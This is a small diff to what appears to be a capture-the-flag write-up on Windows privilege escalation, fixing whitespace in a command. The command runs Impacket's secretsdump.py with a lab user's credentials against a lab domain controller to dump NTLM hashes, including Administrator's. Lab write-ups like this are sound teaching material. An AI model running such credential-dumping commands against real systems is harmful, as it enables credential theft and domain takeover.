@@ -4,7 +4,7 @@ There's a few ways to priv esc here
 
 Because we have creds, `secretsdump.py` will also dump hashes for us.
 
-` python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.127.164`
+`python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.127.164`
 
 This will give us the NTLM hash for `Administrator`
 
